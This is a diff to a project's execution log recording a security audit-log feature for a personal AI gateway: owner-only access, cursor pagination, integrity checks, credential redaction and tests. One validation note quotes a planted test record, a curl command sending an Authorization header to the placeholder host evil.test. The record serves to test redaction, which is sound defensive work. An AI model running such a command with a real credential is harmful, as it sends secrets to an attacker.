@@ -136,6 +136,95 @@ def credential_backend() -> CredentialBackend: ...   # keychain if available+ena
 
 ## Execution log
 
+### 2026-08-16 — SH-8 (S4 T4.1/T4.2/V4 · Contract C4) SEL audit surface — DONE
+
+- **[SH-8] DONE:** C4 lands as `GET /api/security/audit` (cursor-paginated, filters
+  caller/operation/outcome/downstream_service/since/until) and `GET /api/security/audit/verify`
+  (`{checked, ok, valid, tampered, windowed}`) in a new
+  `dashboard/handlers/security_audit.py`, registered beside the other `/api/security/*` reads.
+  The reader itself is `sel.SecurityEventLog.audit_page()` — it needs `_tail_lines` and the HMAC
+  key, so it lives with them rather than reaching into SEL privates from a handler.
+
+- **[SH-8] DISCOVERY — the surface already half-existed, and its pagination was a stub.**
+  `/api/sel/events` + `/api/sel/verify` + a `settings/AuditPanel.tsx` were already shipped. The
+  panel fetched a **fixed 200 events** and filtered them **client-side**, and `api.ts` sent an
+  `offset` query param that **the handler never read** — so "pagination" was decorative. Under
+  the clean-break tenet (and AGENTS.md "There is one audit log — never a second") the two GET
+  routes were **deleted, not duplicated**: one audit log, one way to read it. `POST /api/sel/rotate`
+  is untouched — a write path with a different risk profile and outside this atom. Census before
+  deleting: 6 code sites + 2 doc lines, all updated.
+
+- **[SH-8] DEVIATION — an offset scheme is unfixable here, so the contract is a cursor.**
+  C4 says "paginated" without naming a scheme. An offset over an append-only log read
+  newest-first is wrong by construction: *k* concurrent appends shift every element *k* places,
+  so page 2 re-serves *k* seen rows, and a concurrent `prune()` shifts the other way and **skips**
+  rows — an audit surface omitting events while looking complete. `audit_page` therefore anchors
+  on the last row's `event_id`: a page is the next `limit` matching records strictly older than
+  the anchor, and appends land strictly newer, so pages 2..N cannot shift. An anchor that aged
+  out returns `cursor_found=False` → **400 `invalid_cursor`**, never a silent restart from the
+  newest record (which would re-serve the whole trail as if fresh).
+
+- **[SH-8] Authorization — the audit read is OWNER-ONLY, a deliberate tightening.**
+  The trail spans every actor on the instance, so an app-scoped token reading it is a
+  cross-tenant read — the same escalation `POST /api/apps/{name}/token` already refuses ("apps
+  may not mint tokens"). The app-permission middleware is only an allowlist, so an app that
+  *declared* `/api/security` would have passed it; `_refuse_app` is the categorical refusal, and
+  it SEL-logs the denial exactly as the middleware's own deny path does. **Measured before
+  enforcing** (per "enforcing a dead control is an outage"): zero apps declare `/api/sel` or
+  `/api/security` — the native bundles declare no `api` scope at all and the two first-party
+  apps declare unrelated prefixes — so the refusal denies nothing that works today. The
+  superseded `/api/sel/events` had no such refusal; this is strictly tighter than what it replaced.
+  Successful reads are **not** logged: this repo audits mutations only (`sel_audit_middleware`),
+  and a read that appends to the log it just read would grow the log on every page view and
+  appear in its own results.
+
+- **[SH-8] Credential safety — one redaction definition, and it runs AFTER verification.**
+  `log()`'s inline `_redact_deep` closure was promoted to module-level `sel.redact_event()`, now
+  shared by the forward callback and the audit read, so the table and the export can never
+  disagree about what is safe. Ordering is load-bearing: `integrity_ok` is computed on the RAW
+  line, because redacting first rewrites the very bytes the HMAC covers and would report every
+  secret-bearing record as tampered. `_UNREDACTED_FIELDS` exempts the five machine-generated
+  structural fields (`event_id`/`timestamp`/`event_type`/`prev_hash`/`entry_hash`) so an exported
+  record stays verifiable by anyone holding the key — `_B64_CHUNK_RE` matches any 40+ char run of
+  the base64 alphabet and a 64-char hex digest qualifies, so today it spares the hashes only
+  because random decoded bytes don't look like a credential. Now it spares them by rule.
+
+- **[SH-8] Fail-closed filtering.** An unknown query param, a non-integer or out-of-range
+  `limit`, an unparseable time bound and an expired cursor are all **refused** with the
+  §"Shared conventions" envelope (`unknown_filter` / `invalid_limit` / `invalid_time_filter` /
+  `invalid_cursor`), never ignored — a silently-dropped filter returns the whole log while
+  looking like it narrowed it. A date-only `until` widens to end-of-day, because bare
+  lexicographic compare against `YYYY-MM-DD` means midnight and would hide the whole named day.
+
+- **[SH-8] Frontend (T4.2).** `AuditPanel.tsx` moves to server-side filters + cursor
+  pagination ("Load older events"), a per-row integrity badge (red rail + glyph **and** an
+  accessible name, so the verdict is never colour-only), an assertive live-region summary, and
+  credential-safe JSONL export via a pure exported `toJsonl` — the rows are already redacted
+  server-side, so the exporter is a serializer and deliberately **not** a second redaction pass.
+  The old client-side outcome pills were replaced by presets that write the *server* filter:
+  filtering after paging made "Load more" fetch rows the pill then hid, and the count meaningless.
+
+- **[SH-8] V4 validation (real gateway, `:10111`, `PERSONALCLAW_HOME=/private/tmp/sh8-home`).**
+  57 genuine SEL events from gateway boot + real API calls. Page 1 (limit 5) → append 5 events →
+  page 2 by cursor: disjoint, contiguous, nothing skipped. A hand-altered record (no re-sign)
+  showed `integrity_ok:false` on exactly that row while `verify` returned
+  `{checked:57, ok:false, tampered:1}`; the page rendered "Chain broken — 1 of 57 events altered"
+  plus the per-row rail in **both themes**. "Load older events" took 50 → 57 and settled to
+  "All 57 matching events shown." A planted `sk-ant-api03-…` key rendered as
+  `curl -H 'Authorization: [REDACTED: credential]' https://evil.test` — still forensically
+  useful, no secret. The real Export button produced `application/x-ndjson`, 3 lines, every line
+  re-parsed (round-trip), tamper flag carried, 64-char `entry_hash` intact, no plaintext secret.
+  Zero console errors/warnings. Only the secret-bearing record was synthesized (through the real
+  `log_tool_invocation` writer — a genuine denied-bash event needs a live model); every other
+  event was produced by driving the app.
+
+- **[SH-8] Tests.** `tests/test_security_audit_api.py` (22) + `web/.../auditExport.test.ts` (6).
+  Falsified three ways: dropping `_refuse_app` → `assert 200 == 403`; dropping `redact_event` →
+  `the plaintext secret survived into the audit response`; swapping the anchor for a naive offset
+  → `pages overlap: ['e0005', 'e0006', 'e0007', 'e0008', 'e0009']` (exactly the 5 concurrent
+  appends). The precondition assertion in `test_integrity_is_computed_before_redaction` also
+  fired under the redaction mutation, proving that test is not vacuous.
+
 ### 2026-08-15 — SH-1 (T1.1 / Design S1 / Contract C1) credential backend selector — DONE
 
 - **[SH-1] DONE:** C1 lands in `config/loader.py`: `CredentialBackend = Literal["keychain",
